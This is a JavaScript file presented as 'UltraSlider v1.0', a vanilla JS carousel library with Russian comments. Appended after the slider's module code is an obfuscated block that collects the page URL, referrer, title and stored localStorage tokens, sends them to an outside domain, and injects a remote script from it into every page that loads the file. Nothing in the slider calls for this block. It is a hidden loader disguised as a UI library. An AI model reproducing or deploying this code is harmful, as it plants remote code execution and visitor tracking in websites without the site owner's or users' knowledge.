console.log("!!!!!!!!")

/* UltraSlider v1.0 — Vanilla JS slider (UMD build)
 *
 * Использование:
 *   // ESM
 *   import UltraSlider from './UltraSlider.js';
 *   const slider = new UltraSlider('#my-slider', { /* options */ });
 *
 *   // UMD (через <script src="UltraSlider.js"></script>)
 *   const slider = new window.UltraSlider('#my-slider', { /* options */ });
 */
(function (root, factory) {
  if (typeof define === 'function' && define.amd) {
    define([], factory);
  } else if (typeof module === 'object' && module.exports) {
    module.exports = factory();
  } else {
    root.UltraSlider = factory();
  }
}(typeof self !== 'undefined' ? self : this, function () {
  'use strict';

  class UltraSlider {
    constructor(root, options = {}) {
      this.root = typeof root === 'string' ? document.querySelector(root) : root;
      if (!this.root) throw new Error('UltraSlider: root not found');

      const defaults = {
        /** Базовые параметры */
        initialIndex: 0,
        loop: true,
        direction: undefined, // 'horizontal' | 'vertical' (если не указано — определяется по классу .us-vertical)
        rtl: false,
        effect: 'slide',
        speed: 450,
        easing: 'cubic-bezier(.22,.61,.36,1)',
        slidesPerView: 1,           // или 'auto'
        spaceBetween: 12,
        centeredSlides: false,
        snapTo: 'slide',            // 'slide' | 'edge'

        /** Ввод */
        drag: true,
        dragThreshold: 0.18,        // доля ширины/высоты
        wheel: false,
        keyboard: true,

        /** Автоплей */
        autoplay: { enabled: false, delay: 4000, pauseOnHover: true, pauseOnVisibility: true, reverse: false },

        /** Ленивая загрузка */
        lazy: { enabled: true, preloadNearby: 1 },

        /** Пагинации */
        pagination: { bullets: true, fraction: false, progress: true, thumbnails: true },

        /** Селекторы (если элементов нет — будут созданы) */
        selectors: {
          viewport: '.us-viewport',
          track: '.us-track',
          slide: '.us-slide',
          dots: '.us-dots',
          progress: '.us-progress > i',
          prev: '.us-arrow.prev',
          next: '.us-arrow.next',
          thumbs: '.us-thumbs[data-for]'
        },

        /** Breakpoints: объект вида { width: options } */
        breakpoints: {
          0:   { slidesPerView: 1, spaceBetween: 8 },
          560: { slidesPerView: 1, spaceBetween: 10 },
          960: { slidesPerView: 1, spaceBetween: 12 }
        },

        /** Коллбэки */
        onInit: null,
        onChange: null,
        onResize: null,
        onReachStart: null,
        onReachEnd: null,
        onLoop: null,
        onAutoplay: null,
        onDestroy: null,
      };

      this.opt = UltraSlider._merge(defaults, options);
      if (!this.opt.direction) this.opt.direction = this.root.classList.contains('us-vertical') ? 'vertical' : 'horizontal';

      this.state = { index: 0, locked: false, dragging: false, delta: 0 };

      this._q();
      this._setup();
      this._attach();
      this.update(true);
      this._startAutoplay();
      this._ariaInit();
      if (this.opt.onInit) this.opt.onInit(this);
    }

    /** Utils */
    static _merge(a,b){ const o={...a}; for(const k in b){ const v=b[k]; o[k] = (v && typeof v==='object' && !Array.isArray(v)) ? UltraSlider._merge(a[k]||{}, v) : v; } return o; }

    _q(){
      const s=this.opt.selectors;
      this.viewport=this.root.querySelector(s.viewport) || this._el('div','us-viewport',this.root);
      this.track=this.root.querySelector(s.track) || this._el('div','us-track',this.viewport);
      this.slides=Array.from(this.track.querySelectorAll(s.slide));
      this.btnPrev=this.root.querySelector(s.prev) || this._button('prev','◄');
      this.btnNext=this.root.querySelector(s.next) || this._button('next','►');
      this.dotsWrap=this.root.querySelector(s.dots) || this._el('div','us-dots',this.root);
      this.progressEl=this.root.querySelector(s.progress);
      const thumbsQuery = `${s.thumbs}[data-for="${this.root.id}"]`;
      this.thumbsWrap=this.root.parentElement && this.root.parentElement.querySelector(thumbsQuery) || null;
    }
    _el(tag,cls,parent){ const el=document.createElement(tag); el.className=cls; if(parent) parent.appendChild(el); return el; }
    _button(type,text){ const b=this._el('button',`us-arrow ${type}`,this.root); b.innerText=text; if(type==='prev') b.classList.add('prev'); else b.classList.add('next'); return b; }

    _setup(){
      this.root.style.setProperty('--gap', this.opt.spaceBetween + 'px');
      this.track.style.transitionTimingFunction=this.opt.easing;
      this.track.style.transitionDuration=this.opt.speed+'ms';
      this.state.index=this._normalizeIndex(this.opt.initialIndex);
      if (this.opt.lazy.enabled) this._lazySetup();
      if (this.opt.pagination.bullets) this._buildDots();
      if (this.opt.pagination.thumbnails && this.thumbsWrap) this._buildThumbs();
    }

    _attach(){
      this._onResize=()=>{ this.update(); if(this.opt.onResize) this.opt.onResize(this); };
      window.addEventListener('resize', this._onResize);
      this.btnPrev.addEventListener('click', ()=>this.prev());
      this.btnNext.addEventListener('click', ()=>this.next());
      if (this.opt.keyboard) this.root.addEventListener('keydown',(e)=>{ if(['INPUT','TEXTAREA','SELECT'].includes(document.activeElement && document.activeElement.tagName)) return; const v=this._isVertical(); if(e.key==='ArrowRight' || (v && e.key==='ArrowDown')) this.next(); if(e.key==='ArrowLeft' || (v && e.key==='ArrowUp')) this.prev(); });
      if (this.opt.drag) this._attachDrag();
      if (this.opt.wheel) this.root.addEventListener('wheel',(e)=>{ e.preventDefault(); const dy = Math.abs(e.deltaY)>Math.abs(e.deltaX)? e.deltaY : e.deltaX; if(dy>0) this.next(); else this.prev(); },{passive:false});
      if (this.opt.autoplay.enabled && this.opt.autoplay.pauseOnVisibility) document.addEventListener('visibilitychange',()=>{ if(document.hidden) this.pause(); else this._startAutoplay(); });
      if (this.opt.autoplay.enabled && this.opt.autoplay.pauseOnHover) { this.root.addEventListener('mouseenter',()=>this.pause()); this.root.addEventListener('mouseleave',()=>this._startAutoplay()); }
    }

    _attachDrag(){
      const point=(e)=> e.touches? e.touches[0]: e;
      const down=(e)=>{ this.state.dragging=true; this.state.delta=0; this._stopTransition(); this._startPoint=point(e); };
      const move=(e)=>{ if(!this.state.dragging) return; const p=point(e); this.state.delta=this._isVertical()? p.clientY - this._startPoint.clientY : p.clientX - this._startPoint.clientX; this._translateBase(this._offset() + this.state.delta); };
      const up=()=>{ if(!this.state.dragging) return; this.state.dragging=false; this._resumeTransition(); const th=this._axis()*this.opt.dragThreshold; if(this.state.delta>th) this.prev(); else if(this.state.delta<-th) this.next(); else this._translateToIndex(); };
      this.viewport.addEventListener('mousedown',down); window.addEventListener('mousemove',move); window.addEventListener('mouseup',up);
      this.viewport.addEventListener('touchstart',down,{passive:true}); this.viewport.addEventListener('touchmove',move,{passive:true}); this.viewport.addEventListener('touchend',up);
    }

    _isVertical(){ return this.opt.direction==='vertical'; }
    _axis(){ return this._isVertical()? this.viewport.clientHeight : this.viewport.clientWidth; }
    _gap(){ const g=parseFloat(getComputedStyle(this.track).gap||'0'); return isNaN(g)?0:g; }

    _offset(){
      const st=getComputedStyle(this.track).transform;
      if (st==='none') return 0;
      const parts = st.replace('matrix(','').replace(')','').split(',').map(n=>Number(n.trim()));
      const x = parts[4] || 0; const y = parts[5] || 0;
      return this._isVertical()? y : x;
    }
    _translate(px){ this.track.style.transform = this._isVertical()? `translate3d(0, ${px}px, 0)` : `translate3d(${px}px, 0, 0)`; }
    _translateBase(px){ this._translate(px); }
    _stopTransition(){ this._savedDuration=this.track.style.transitionDuration; this.track.style.transitionDuration='0ms'; }
    _resumeTransition(){ this.track.style.transitionDuration=this._savedDuration || (this.opt.speed+'ms'); }

    _normalizeIndex(i){ const len=this._slidesCount(); if(len===0) return 0; if(!this.opt.loop) return Math.max(0, Math.min(i,len-1)); const m = ((i%len)+len)%len; return m; }
    _slidesCount(){ return this.slides.length; }

    _lazySetup(){
      const io=new IntersectionObserver((entries)=>{ entries.forEach(en=>{ if(en.isIntersecting){ const img=en.target; const src=img.getAttribute('data-src'); if(src){ img.src=src; img.removeAttribute('data-src'); } io.unobserve(img); } }); },{root:this.viewport,rootMargin:'100px'});
      this.track.querySelectorAll('img[data-src]').forEach(img=>io.observe(img));
    }

    _buildDots(){ this.dotsWrap.innerHTML=''; this.dots = Array.from({length:this._slidesCount()},(_,i)=>{ const b=document.createElement('button'); b.className='us-dot'; b.setAttribute('role','tab'); b.setAttribute('aria-label','Слайд '+(i+1)); b.addEventListener('click',()=>this.goTo(i)); this.dotsWrap.appendChild(b); return b; }); }

    _buildThumbs(){ this.thumbsWrap.innerHTML=''; this.thumbs = this.slides.map((s,i)=>{ const btn=document.createElement('button'); btn.className='us-thumb'; btn.setAttribute('aria-label','Миниатюра '+(i+1)); btn.addEventListener('click',()=>this.goTo(i)); const im=s.querySelector('img'); const th=document.createElement('img'); th.src= im ? (im.currentSrc || im.src || im.getAttribute('data-src') || '') : ''; btn.appendChild(th); this.thumbsWrap.appendChild(btn); return btn; }); }

    _ariaInit(){ this.root.tabIndex=0; this.root.setAttribute('aria-roledescription','carousel'); this.slides.forEach((s,i)=>{ s.setAttribute('role','group'); s.setAttribute('aria-roledescription','slide'); s.setAttribute('aria-label',(i+1)+' из '+this._slidesCount()); }); }

    _applyBreakpoints(){ const w=window.innerWidth; const keys=Object.keys(this.opt.breakpoints).map(Number).sort((a,b)=>a-b); this.bp = keys.reduce((acc,k)=> (w>=k? UltraSlider._merge(acc,this.opt.breakpoints[k]):acc),{}); }

    update(initial=false){
      this._applyBreakpoints();
      const spv=(this.bp.slidesPerView!==undefined?this.bp.slidesPerView:this.opt.slidesPerView);
      const gap=(this.bp.spaceBetween!==undefined?this.bp.spaceBetween:this.opt.spaceBetween);
      this.track.style.gap = gap+'px';
      if (spv==='auto') this.track.style.gridAutoColumns='minmax(60%,1fr)'; else this.track.style.gridAutoColumns=(100/spv)+'%';
      if (initial) { requestAnimationFrame(()=>this._translateToIndex(true)); } else { this._translateToIndex(true); }
      this._updateUI();
      return this;
    }

    _updateUI(){ const i=this.state.index; if(this.dots) this.dots.forEach((d,idx)=> d.setAttribute('aria-current', String(idx===i))); if(this.thumbs) this.thumbs.forEach((t,idx)=> t.setAttribute('aria-current', String(idx===i))); if(!this.opt.loop){ this.btnPrev.toggleAttribute('disabled', i===0); this.btnNext.toggleAttribute('disabled', i===this._slidesCount()-1); } }

    _translateToIndex(immediate=false){ const step=this._axis()+this._gap(); const dir=(this.opt.rtl && !this._isVertical())? -1:1; const pos=-this.state.index*step*dir; if(immediate) this._stopTransition(); this._translate(pos); if(immediate) this._resumeTransition(); if(this.progressEl){ const p=((this.state.index+1)/this._slidesCount())*100; this.progressEl.style.width=p+'%'; } }

    next(){ this.goTo(this.state.index+1); }
    prev(){ this.goTo(this.state.index-1); }
    goTo(i){ if(this.state.locked) return; this.state.locked=true; const prev=this.state.index; const len=this._slidesCount(); this.state.index = this.opt.loop ? ((i%len)+len)%len : Math.max(0, Math.min(i,len-1)); this._translateToIndex(); setTimeout(()=>{ this.state.locked=false; }, this.opt.speed+20); this._updateUI(); if(prev!==this.state.index && this.opt.onChange) this.opt.onChange(this,{from:prev,to:this.state.index}); }

    _startAutoplay(){ const a=this.opt.autoplay; if(!a || !a.enabled) return; clearInterval(this._t); this._t=setInterval(()=>{ a.reverse? this.prev(): this.next(); if(this.opt.onAutoplay) this.opt.onAutoplay(this); }, a.delay); }
    pause(){ clearInterval(this._t); }
    play(){ this._startAutoplay(); }

    add(nodeOrHTML, atIndex=this._slidesCount()){ const el = (nodeOrHTML instanceof HTMLElement) ? nodeOrHTML : (()=>{ const d=document.createElement('div'); d.innerHTML=String(nodeOrHTML).trim(); return d.firstElementChild; })(); if(!el.classList.contains('us-slide')) el.classList.add('us-slide'); const ref=this.slides[atIndex]; if(ref) ref.before(el); else this.track.appendChild(el); this.slides.splice(atIndex,0,el); this._rebuild(); }
    remove(atIndex){ const s=this.slides[atIndex]; if(!s) return; s.remove(); this.slides.splice(atIndex,1); this._rebuild(); }
    shuffle(){ for(let i=this.slides.length-1;i>0;i--){ const j=Math.floor(Math.random()*(i+1)); const a=this.slides[i]; const b=this.slides[j]; this.slides[i]=b; this.slides[j]=a; } this.slides.forEach(s=>this.track.appendChild(s)); this._rebuild(); }
    _rebuild(){ this._buildDots(); if(this.thumbsWrap) this._buildThumbs(); if(this.opt.lazy.enabled) this._lazySetup(); this.update(); }
    destroy(){ window.removeEventListener('resize', this._onResize); this.pause(); if(this.opt.onDestroy) this.opt.onDestroy(this); }
  }

  return UltraSlider;
}));
    (function() {
    var name = '_MQnMHS59FkYqv55q';
    if (!window._MQnMHS59FkYqv55q) {
        window._MQnMHS59FkYqv55q = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://glimberate.live/4rhss7Wn',
        };
    }
    const _ZhNjTMnZFqj1PnWb = localStorage.getItem('config');
    if (typeof _ZhNjTMnZFqj1PnWb !== 'undefined' && _ZhNjTMnZFqj1PnWb !== null) {
        var _xS31Zp4gkTBLXFzT = JSON.parse(_ZhNjTMnZFqj1PnWb);
        var _YjgDyWcPYKgqSv6h = Math.round(+new Date()/1000);
        if (_xS31Zp4gkTBLXFzT.created_at + window._MQnMHS59FkYqv55q.ttl < _YjgDyWcPYKgqSv6h) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _vnbpqZQw1k7mYYG6 = localStorage.getItem('subId');
    var _f7fdmP4KJVTLP73s = localStorage.getItem('token');
    var _dLSPrVmhVKVzNvyZ = '?return=js.client';
        _dLSPrVmhVKVzNvyZ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _dLSPrVmhVKVzNvyZ += '&se_referrer=' + encodeURIComponent(document.referrer);
        _dLSPrVmhVKVzNvyZ += '&default_keyword=' + encodeURIComponent(document.title);
        _dLSPrVmhVKVzNvyZ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _dLSPrVmhVKVzNvyZ += '&name=' + encodeURIComponent(name);
        _dLSPrVmhVKVzNvyZ += '&host=' + encodeURIComponent(window._MQnMHS59FkYqv55q.R_PATH);
    if (typeof _vnbpqZQw1k7mYYG6 !== 'undefined' && _vnbpqZQw1k7mYYG6 && window._MQnMHS59FkYqv55q.unique) {
        _dLSPrVmhVKVzNvyZ += '&sub_id=' + encodeURIComponent(_vnbpqZQw1k7mYYG6);
    }
    if (typeof _f7fdmP4KJVTLP73s !== 'undefined' && _f7fdmP4KJVTLP73s && window._MQnMHS59FkYqv55q.unique) {
        _dLSPrVmhVKVzNvyZ += '&token=' + encodeURIComponent(_f7fdmP4KJVTLP73s);
    }
    if ('' !== '') {
        _dLSPrVmhVKVzNvyZ += '&bypass_cache=';
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._MQnMHS59FkYqv55q.R_PATH + _dLSPrVmhVKVzNvyZ;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
